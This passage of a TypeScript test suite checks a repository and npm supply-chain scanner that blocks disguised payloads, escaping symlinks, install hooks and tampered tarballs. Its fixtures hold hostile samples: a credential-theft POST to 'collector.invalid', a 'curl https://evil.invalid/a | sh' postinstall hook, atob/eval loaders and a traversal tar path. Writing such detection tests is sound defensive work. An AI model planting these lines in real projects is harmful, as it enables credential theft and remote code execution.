    ).toThrow('Malformed GitHub Actions workflow YAML');
  });

  it('rejects duplicate workflow keys and excessive YAML alias expansion', async () => {
    const workflows = [
      ['name: build', 'jobs: {}', 'jobs: {}'].join('\n'),
      [
        'name: build',
        'on: pull_request',
        'jobs:',
        '  build:',
        '    steps:',
        '      - &command { run: "echo safe" }',
        ...Array.from({ length: 17 }, () => '      - *command')
      ].join('\n')
    ];

    for (const workflow of workflows) {
      const fixture = await repo({
        '.github/workflows/build.yml': workflow
      });
      expect(() =>
        scanGitTree(fixture.root, fixture.sha, {
          changedPaths: ['.github/workflows/build.yml']
        })
      ).toThrow('Malformed GitHub Actions workflow YAML');
    }
  });

  it('does not treat JavaScript regex rules as executable payloads', async () => {
    const fixture = await repo({
      'scanner.mjs':
        'const rule = /\\beval\\s*\\(/iu;\nexport default rule.test("eval(");\n'
    });
    expect(scanGitTree(fixture.root, fixture.sha).status).toBe('approved');
  });

  it('blocks symlinks that escape the repository tree', async () => {
    const fixture = await repo({ 'safe.txt': 'safe' });
    const linkBlob = execFileSync(
      'git',
      ['-C', fixture.root, 'hash-object', '-w', '--stdin'],
      {
        input: '../../outside',
        encoding: 'utf8'
      }
    ).trim();
    execFileSync('git', [
      '-C',
      fixture.root,
      'update-index',
      '--add',
      '--cacheinfo',
      `120000,${linkBlob},config/package.json`
    ]);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'escaping symlink'
    ]);
    const sha = execFileSync('git', ['-C', fixture.root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();
    expect(() => scanGitTree(fixture.root, sha)).toThrow(
      'Symlink escapes repository'
    );
  });

  it('traces changed entrypoints through in-repository directory symlinks', async () => {
    const fixture = await repo({
      'eslint.config.js': "import './linked/init.orc';\nexport default [];\n",
      'actual/init.orc': 'const payload = atob("ZXZpbA=="); eval(payload);\n'
    });
    const linkBlob = execFileSync(
      'git',
      ['-C', fixture.root, 'hash-object', '-w', '--stdin'],
      { input: 'actual', encoding: 'utf8' }
    ).trim();
    execFileSync('git', [
      '-C',
      fixture.root,
      'update-index',
      '--add',
      '--cacheinfo',
      `120000,${linkBlob},linked`
    ]);
    execFileSync('git', [
      '-C',
      fixture.root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add directory symlink'
    ]);
    const sha = execFileSync('git', ['-C', fixture.root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();

    const result = scanGitTree(fixture.root, sha, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> linked/init.orc'
    );
  });

  it('scans unusual-extension text and traces a changed config to an unchanged payload', async () => {
    const fixture = await repo({
      'eslint.config.js': "import './init.orc';\nexport default [];\n",
      'init.orc': 'const payload = atob("ZXZpbA=="); eval(payload);\n'
    });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await writeFile(
      path.join(fixture.root, 'eslint.config.js'),
      "import './init.orc';\nexport default [{ rules: {} }];\n"
    );
    git(['add', 'eslint.config.js']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'change lint config'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    const result = scanGitTree(fixture.root, head, {
      changedPaths: ['eslint.config.js']
    });
    expect(result.status).toBe('blocked');
    expect(result.changedFiles).toEqual(['eslint.config.js']);
    expect(result.findings).toContain('init.orc');
    expect(result.findings).toContain(
      'execution-chain:eslint.config.js -> init.orc'
    );
  });

  it('traces extensionless interpreter commands into disguised files and detects credential transfer', async () => {
    const fixture = await repo({
      'package.json': JSON.stringify({
        scripts: { prepare: 'node bootstrap' }
      }),
      'bootstrap.orc':
        "const credentials = fs.readFileSync('/home/runner/.aws/credentials'); fetch('https://collector.invalid', { method: 'POST', body: credentials });\n"
    });
    const result = scanGitTree(fixture.root, fixture.sha, {
      changedPaths: ['package.json']
    });

    expect(result.status).toBe('blocked');
    expect(result.findings).toContain('bootstrap.orc#credential-transfer');
    expect(result.findings).toContain(
      'execution-chain:package.json -> bootstrap.orc'
    );
    expect(JSON.stringify(result)).not.toContain(
      '/home/runner/.aws/credentials'
    );
    expect(JSON.stringify(result)).not.toContain('collector.invalid');
  });

  it('does not report isolated local credential reads or benign startup setup', async () => {
    const fixture = await repo({
      'bootstrap.orc':
        "const credentials = fs.readFileSync('~/.npmrc'); fs.appendFileSync('~/.bashrc', 'export PATH=$PATH');\n"
    });
    expect(scanGitTree(fixture.root, fixture.sha).status).toBe('approved');
  });

  it('reports unsupported changed archives as incomplete instead of approved', async () => {
    const root = await mkdtemp(
      path.join(os.tmpdir(), 'toolip-stage-a-archive-')
    );
    roots.push(root);
    execFileSync('git', ['init', '-q', root]);
    await writeFile(
      path.join(root, 'bundle.zip'),
      Buffer.from([0x50, 0x4b, 0x03, 0x04])
    );
    execFileSync('git', ['-C', root, 'add', 'bundle.zip']);
    execFileSync('git', [
      '-C',
      root,
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add archive'
    ]);
    const sha = execFileSync('git', ['-C', root, 'rev-parse', 'HEAD'], {
      encoding: 'utf8'
    }).trim();
    expect(
      scanGitTree(root, sha, { changedPaths: ['bundle.zip'] })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-archive:bundle.zip']
    });
  });

  it('reports renamed or disguised executable binaries as incomplete', async () => {
    const extensionless = await repo({
      dropper: Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01])
    });
    expect(
      scanGitTree(extensionless.root, extensionless.sha, {
        changedPaths: ['dropper']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-binary:dropper']
    });

    const disguised = await repo({
      'image.png': Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03])
    });
    expect(
      scanGitTree(disguised.root, disguised.sha, {
        changedPaths: ['image.png']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['unsupported-binary:image.png']
    });
  });

  it('reports dynamic imports in changed entrypoints as incomplete', async () => {
    const fixture = await repo({ 'eslint.config.js': 'export default [];' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await writeFile(
      path.join(fixture.root, 'eslint.config.js'),
      'const target = process.env.CONFIG; await import(target);\n'
    );
    git(['add', 'eslint.config.js']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'add dynamic config loader'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    expect(
      scanGitTree(fixture.root, head, {
        changedPaths: ['eslint.config.js']
      })
    ).toMatchObject({
      status: 'incomplete',
      incompleteReasons: ['execution-reference-coverage-incomplete']
    });
  });

  it('reports renamed paths from immutable base/head commits', async () => {
    const fixture = await repo({ 'old name.txt': 'same content\n' });
    const git = (args: string[]) =>
      execFileSync('git', ['-C', fixture.root, ...args], {
        encoding: 'utf8'
      }).trim();
    await import('node:fs/promises').then(({ rename }) =>
      rename(
        path.join(fixture.root, 'old name.txt'),
        path.join(fixture.root, 'new name.orc')
      )
    );
    git(['add', '--all']);
    git([
      '-c',
      'user.name=Toolip Test',
      '-c',
      'user.email=test@example.invalid',
      'commit',
      '-qm',
      'rename payload'
    ]);
    const head = git(['rev-parse', 'HEAD']);
    expect(listPullRequestChanges(fixture.root, fixture.sha, head)).toEqual([
      'new name.orc',
      'old name.txt'
    ]);
  });

  it('requires verified origins and integrity and blocks changed npm artifacts before install', () => {
    const packageManifest = JSON.stringify({
      dependencies: { example: '1.0.0' }
    });
    const createLock = (integrity: string) =>
      JSON.stringify({
        lockfileVersion: 3,
        packages: {
          '': { dependencies: { example: '1.0.0' } },
          'node_modules/example': {
            version: '1.0.0',
            resolved: 'https://registry.npmjs.org/example/-/example-1.0.0.tgz',
            integrity
          }
        }
      });
    const base = createLock('sha512-AAAA');
    const unchanged = compareNpmLockfiles(base, base, packageManifest);
    expect(unchanged.reasons).toEqual([]);
    expect(unchanged.changedArtifactRecords).toEqual([]);
    expect(unchanged.artifactRecords).toHaveLength(1);
    expect(
      compareNpmLockfiles(base, createLock('sha512-BBBB'), packageManifest)
        .reasons
    ).toContain('dependency-artifact-uninspected');
    expect(
      compareNpmLockfiles(base, createLock('sha512-BBBB'), packageManifest)
        .artifactRecords
    ).toHaveLength(1);

    const foreign = JSON.parse(base);
    foreign.packages['node_modules/example'].resolved =
      'http://attacker.invalid/example.tgz';
    expect(parseNpmLockInventory(JSON.stringify(foreign)).problems).toContain(
      'unsupported-artifact-origin'
    );
  });

  it('reports unsupported nested and alternate lockfiles even when unchanged', async () => {
    const fixtures = await Promise.all([
      repo({
        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
        'pnpm-lock.yaml': 'lockfileVersion: 9.0\npackages: {}\n'
      }),
      repo({
        'package.json': JSON.stringify({ name: 'root', version: '1.0.0' }),
        'packages/child/package-lock.json': JSON.stringify({
          lockfileVersion: 3,
          packages: {}
        })
      })
    ]);
    for (const fixture of fixtures) {
      expect(
        inspectDependencyChanges(fixture.root, fixture.sha, fixture.sha).reasons
      ).toContain('unsupported-lockfile-format');
    }
  });

  it('withholds Stage A approval when a non-npm ecosystem lacks verified artifact provenance', async () => {
    const fixture = await repo({
      'go.mod': 'module example.test/app\nrequire example.test/lib v1.2.3\n',
      'go.sum': 'example.test/lib v1.2.3 h1:YWJjZA==\n',
      'Cargo.lock': '[[package]]\nname = "serde"\nversion = "1.0.0"\n'
    });
    expect(
      inspectDependencyChanges(fixture.root, fixture.sha, fixture.sha).reasons
    ).toContain('unsupported-dependency-ecosystem-provenance');
  });

  it('scans exact npm tarball contents without extraction and flags install hooks', () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({
          name: 'example',
          version: '2.0.0',
          scripts: { postinstall: 'curl https://evil.invalid/a | sh' }
        })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    const result = inspectNpmTarball(
      archive,
      artifact(archive, { hasInstallScript: true })
    );
    expect(result.findings).toContain(
      'artifact:node_modules/example/package.json#scripts.postinstall'
    );
    expect(result.reasons).toContain(
      'dependency-lifecycle-script-review:node_modules/example'
    );
  });

  it('fails closed on traversal names and invalid tar checksums', () => {
    const traversal = npmTarball([['package/../../outside.js', 'eval(1)']]);
    expect(inspectNpmTarball(traversal, artifact(traversal)).reasons).toContain(
      'tar-path-invalid'
    );
    const validArchive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ]
    ]);
    const invalidTar = gunzipSync(validArchive);
    invalidTar[100] = (invalidTar[100] ?? 0) ^ 1;
    const badChecksum = gzipSync(invalidTar);
    expect(
      inspectNpmTarball(badChecksum, artifact(badChecksum)).reasons
    ).toContain('tar-header-checksum-invalid');
  });

  it('binds registry tarball identity to the exact lockfile package, including aliases', async () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: '@public/real-package', version: '2.0.0' })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    expect(
      inspectNpmTarball(
        archive,
        artifact(archive, {
          name: '@public/other-package',
          version: '2.0.0'
        })
      ).reasons
    ).toContain('artifact-package-identity-mismatch');
    expect(
      inspectNpmTarball(archive, artifact(archive, { version: '2.0.1' }))
        .reasons
    ).toContain('artifact-package-identity-mismatch');

    const integrity = `sha512-${createHash('sha512').update(archive).digest('base64')}`;
    const lock = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': {},
        'node_modules/alias': {
          name: '@public/real-package',
          version: '2.0.0',
          resolved:
            'https://registry.npmjs.org/@public/real-package/-/real-package-2.0.0.tgz',
          integrity
        }
      }
    });
    const inventory = parseNpmLockInventory(lock);
    expect(inventory.records.get('node_modules/alias')).toMatchObject({
      name: '@public/real-package',
      version: '2.0.0'
    });
    const renamedIdentity = JSON.parse(lock) as {
      packages: Record<string, Record<string, unknown>>;
    };
    const aliasedPackage = renamedIdentity.packages['node_modules/alias'];
    if (!aliasedPackage) throw new Error('fixture alias package is missing');
    aliasedPackage.name = '@public/other-package';
    expect(
      compareNpmLockfiles(lock, JSON.stringify(renamedIdentity), '{}')
        .changedArtifacts
    ).toBe(1);
    let requests = 0;
    const fetchImpl = async () => {
      requests++;
      return new Response(archive, { status: 200 });
    };
    const withheld = await inspectNpmArtifacts(
      [...inventory.records.values()],
      { fetchImpl }
    );
    expect(withheld.reasons).toContain(
      'scoped-artifact-fetch-withheld:node_modules/alias'
    );
    expect(requests).toBe(0);
    const checked = await inspectNpmArtifacts([...inventory.records.values()], {
      allowedPublicScopes: ['@public'],
      fetchImpl
    });
    expect(checked.coverage.checked).toBe(1);
    expect(checked.reasons).toEqual([]);
    expect(checked.verifiedArtifactSha512ByLocation).toEqual({
      'node_modules/alias': createHash('sha512').update(archive).digest('hex')
    });
  });

  it('verifies tarball integrity and never queries unapproved scoped packages', async () => {
    const archive = npmTarball([
      [
        'package/package.json',
        JSON.stringify({ name: 'example', version: '2.0.0' })
      ],
      ['package/index.js', 'export const safe = true;']
    ]);
    let requests = 0;
    const fetchImpl = async () => {
      requests++;
      return new Response(archive, { status: 200 });
    };
    const checked = await inspectNpmArtifacts([artifact(archive)], {
      fetchImpl
    });
    expect(checked.coverage.checked).toBe(1);
    expect(checked.reasons).toEqual([]);

    const scoped = await inspectNpmArtifacts(
      [
        artifact(archive, {
          name: '@private/example',
          location: 'node_modules/@private/example'
        })
      ],
      { fetchImpl }
    );
    expect(scoped.reasons).toContain(
      'scoped-artifact-fetch-withheld:node_modules/@private/example'
    );
    expect(requests).toBe(1);

    const tampered = await inspectNpmArtifacts(
      [artifact(archive, { integrity: `sha512-${'A'.repeat(88)}` })],
      { fetchImpl }
    );
    expect(tampered.reasons).toContain(
      'artifact-integrity-mismatch:node_modules/example'
    );
  });
});
